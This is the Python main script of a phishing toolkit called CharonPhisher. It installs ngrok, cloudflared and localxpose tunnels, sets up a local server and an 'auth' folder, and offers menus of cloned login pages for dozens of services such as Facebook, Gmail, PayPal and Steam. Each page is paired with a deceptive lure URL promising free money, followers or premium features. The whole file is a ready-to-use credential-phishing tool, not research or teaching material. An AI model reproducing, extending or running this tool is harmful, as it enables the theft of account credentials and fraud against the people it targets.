import os
import sys
import subprocess
import time
import shutil
import signal
from colorama import Fore, Back, init
from modules.config import  __version__
from modules.banner import AsciiArt, Menu
from modules.rainbow import colorize
from modules.control import Control
from modules.settings import Write_Setting
from modules.download import install_cloudflared, install_localxpose, install_ngrok

class CharonPhisher:
    def __init__(self):
        signal.signal(signal.SIGTERM, self.exit_on_signal_SIGTERM)
        signal.signal(signal.SIGINT, self.exit_on_signal_SIGINT)
        Control.kill_processes()
        Control.check_status()
        install_ngrok()
        install_cloudflared()
        install_localxpose()

        if not os.path.isdir(".server"):
            os.makedirs(".server")

        # Check and create directory "auth"
        if not os.path.isdir("auth"):
            os.makedirs("auth")

        # Check if directory ".server/www" exists, recreate if needed
        if os.path.isdir(".server/www"):
            try:
                shutil.rmtree('.server/www')
                os.makedirs(".server/www")
            except:
                pass
        else:
            os.makedirs(".server/www")

        # Remove logfile ".server/.loclx"
        if os.path.exists(".server/.loclx"):
            os.remove(".server/.loclx")

        # Remove logfile ".server/.cld.log"
        if os.path.exists(".server/.cld.log"):
            os.remove(".server/.cld.log")

        while True:
            Control.clear_screen()
            print(AsciiArt.Logo)
            Menu.main_menu()
            reply = str(input(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTMAGENTA_EX} Select an option [00-99]:> "))
            
            if reply in ['1', '01']:self.site_facebook()
            elif reply in ['2', '02']:self.site_instagram()
            elif reply in ['3', '03']: self.site_gmail()
            elif reply in ['4', '04']: Control.tunnel_menu("microsoft", "https://unlimited-onedrive-space-for-free")
            elif reply in ['5', '05']: Control.tunnel_menu("netflix", "https://upgrade-your-netflix-plan-free")
            elif reply in ['6', '06']: Control.tunnel_menu("paypal", "https://get-500-usd-free-to-your-acount")
            elif reply in ['7', '07']: Control.tunnel_menu("steam", "https://steam-500-usd-gift-card-free")
            elif reply in ['8', '08']: Control.tunnel_menu("twitter", "https://get-blue-badge-on-twitter-free")
            elif reply in ['9', '09']: Control.tunnel_menu("playstation", "https://playstation-500-usd-gift-card-free")
            elif reply in '10': Control.tunnel_menu("tiktok", "https://tiktok-free-liker")
            elif reply in '11': Control.tunnel_menu("twitch", "https://unlimited-twitch-tv-user-for-free")
            elif reply in '12': Control.tunnel_menu("pinterest", "https://get-a-premium-plan-for-pinterest-free")
            elif reply in '13': Control.tunnel_menu("snapchat", "https://view-locked-snapchat-accounts-secretly")
            elif reply in '14': Control.tunnel_menu("linkedin", "https://get-a-premium-plan-for-linkedin-free")
            elif reply in '15': Control.tunnel_menu("ebay", "https://get-500-usd-free-to-your-acount")
            elif reply in '16': Control.tunnel_menu("quora", "https://quora-premium-for-free")
            elif reply in '17': Control.tunnel_menu("protonmail", "https://protonmail-pro-basics-for-free")
            elif reply in '18': Control.tunnel_menu("spotify", "https://convert-your-account-to-spotify-premium")
            elif reply in '19': Control.tunnel_menu("reddit", "https://reddit-official-verified-member-badge")
            elif reply in '20': Control.tunnel_menu("adobe", "https://get-adobe-lifetime-pro-membership-free")
            elif reply in '21': Control.tunnel_menu("deviantart", "https://get-500-usd-free-to-your-acount")
            elif reply in '22': Control.tunnel_menu("badoo", "https://get-500-usd-free-to-your-acount")
            elif reply in '23': Control.tunnel_menu("origin", "https://get-500-usd-free-to-your-acount")
            elif reply in '24': Control.tunnel_menu("dropbox", "https://get-1TB-cloud-storage-free")
            elif reply in '25': Control.tunnel_menu("yahoo", "https://grab-mail-from-anyother-yahoo-account-free")
            elif reply in '26': Control.tunnel_menu("wordpress", "https://unlimited-wordpress-traffic-free")
            elif reply in '27': Control.tunnel_menu("yandex", "https://grab-mail-from-anyother-yandex-account-free")
            elif reply in '28': Control.tunnel_menu("stackoverflow", "https://get-stackoverflow-lifetime-pro-membership-free")
            elif reply in '29': self.site_vk()
            elif reply in '30': Control.tunnel_menu("xbox", "https://get-500-usd-free-to-your-acount")
            elif reply in '31': Control.tunnel_menu("mediafire", "https://get-1TB-on-mediafire-free")
            elif reply in '32': Control.tunnel_menu("gitlab", "https://get-1k-followers-on-gitlab-free")
            elif reply in '33': Control.tunnel_menu("github", "https://get-1k-followers-on-github-free")
            elif reply in '34': Control.tunnel_menu("discord", "https://get-discord-nitro-free")
            elif reply in '35': Control.tunnel_menu("roblox", "https://get-free-robux")
            elif reply in '99': Menu.about()
            elif reply in ['0', '00']: Control.msg_exit()
            else:
                print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Invalid Option, Try Again...")
                time.sleep(1)

    def exit_on_signal_SIGINT(self, sig, frame):
        sys.stdout.write(f'\n\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Program Interrupted.\n')
        sys.stdout.flush()
        sys.exit(0)

    def exit_on_signal_SIGTERM(self, sig, frame):
        sys.stdout.write(f'\n\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Program Terminated.\n')
        sys.stdout.flush()
        sys.exit(0)

    def site_facebook(self):
        print(f'''
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}01{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Traditional Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}02{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Advanced Voting Poll Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}03{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Fake Security Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}04{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Facebook Messenger Login Page
        ''')

        reply = input(f"{Fore.LIGHTMAGENTA_EX}Select an option [01-04]:> ")

        if reply in ['1', '01']:
            Write_Setting('website', 'facebook')
            Write_Setting('mask', 'https://blue-verified-badge-for-facebook-free')
            Control.tunnel_menu()
        elif reply in ['2', '02']:
            Write_Setting('website', 'fb_advanced')
            Write_Setting('mask', 'https://vote-for-the-best-social-media')
            Control.tunnel_menu()
        elif reply in ['3', '03']:
            Write_Setting('website', 'fb_security')
            Write_Setting('mask', 'https://make-your-facebook-secured-and-free-from-hackers')
            Control.tunnel_menu()
        elif reply in ['4', '04']:
            Write_Setting('website', 'fb_messenger')
            Write_Setting('mask', 'https://get-messenger-premium-features-free')
            Control.tunnel_menu()
        else:
            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Invalid Option, Try Again...")
            time.sleep(1)
            Control.clear_screen()
            print(AsciiArt.Logo_v2)
            self.site_facebook()

    def site_instagram(self):
        print(f'''
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}01{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Traditional Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}02{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Auto Followers Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}03{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} 1000 Followers Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}04{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Blue Badge Verify Login Page
        ''')

        reply = input(f"{Fore.LIGHTMAGENTA_EX}Select an option [01-04]:> ")

        if reply in ['1', '01']:
            Write_Setting('website', "instagram")
            Write_Setting('mask', 'https://get-unlimited-followers-for-instagram')
            Control.tunnel_menu()
        elif reply in ['2', '02']:
            Write_Setting('website', "ig_followers")
            Write_Setting('mask', 'https://get-unlimited-followers-for-instagram')
            Control.tunnel_menu()
        elif reply in ['3', '03']:
            Write_Setting('website', "insta_followers")
            Write_Setting('mask', 'https://get-1000-followers-for-instagram')
            Control.tunnel_menu()
        elif reply in ['4', '04']:
            Write_Setting('website', "ig_verify")
            Write_Setting('mask', 'https://blue-badge-verify-for-instagram-free')
            Control.tunnel_menu()
        else:
            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Invalid Option, Try Again...")
            time.sleep(1)
            Control.clear_screen()
            print(AsciiArt.Logo_v2)
            self.site_instagram()


    def site_gmail(self):
        print(f'''
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}01{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Gmail Old Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}02{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Gmail New Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}03{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Advanced Voting Poll
        ''')

        reply = input(f"{Fore.LIGHTMAGENTA_EX}Select an option [01-03]:> ")

        if reply in ['1', '01']:
            Write_Setting('website', "google")
            Write_Setting('mask', 'https://get-unlimited-google-drive-free')
            Control.tunnel_menu()
        elif reply in ['2', '02']:
            Write_Setting('website', "google_new")
            Write_Setting('mask', 'https://get-unlimited-google-drive-free')
            Control.tunnel_menu()
        elif reply in ['3', '03']:
            Write_Setting('website', "google_poll")
            Write_Setting('mask', 'https://vote-for-the-best-social-media')
            Control.tunnel_menu()
        else:
            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Invalid Option, Try Again...")
            time.sleep(1)
            Control.clear_screen()
            print(AsciiArt.Logo_v2)
            self.site_gmail()


    
    def site_vk(self):
        print(f'''
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}01{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Traditional Login Page
            {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}02{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Advanced Voting Poll Login Page
        ''')

        reply = input(f"{Fore.LIGHTMAGENTA_EX}Select an option [01-02]:> ")

        if reply in ['1', '01']:
            Write_Setting('website', "vk")
            Write_Setting('mask', 'https://vk-premium-real-method-2020')
            Control.tunnel_menu()
        elif reply in ['2', '02']:
            Write_Setting('website', "vk_poll")
            Write_Setting('mask', 'https://vote-for-the-best-social-media')
            Control.tunnel_menu()
        else:
            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Invalid Option, Try Again...")
            time.sleep(1)
            Control.clear_screen()
            print(AsciiArt.Logo_v2)
            self.site_vk()


CharonPhisher()
